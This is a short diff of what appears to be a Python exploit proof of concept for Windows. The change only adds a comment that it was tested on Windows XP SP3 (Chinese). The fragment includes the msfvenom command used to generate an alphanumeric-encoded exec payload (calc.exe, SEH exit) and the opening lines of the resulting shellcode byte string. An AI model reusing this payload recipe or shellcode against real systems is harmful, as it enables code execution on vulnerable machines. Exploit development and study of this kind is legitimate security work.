@@ -2,7 +2,7 @@ import sys
 from struct import pack
 
 #msfvenom -p windows/exec --platform windows -a x86 -b '\x00' --encoder x86/alpha_mixed -f python CMD=calc.exe EXITFUNC=seh
-
+#Tested on windows xp sp3 zh
 shellcode =  ""
 shellcode += "\x89\xe6\xda\xd9\xd9\x76\xf4\x5e\x56\x59\x49\x49"
 shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
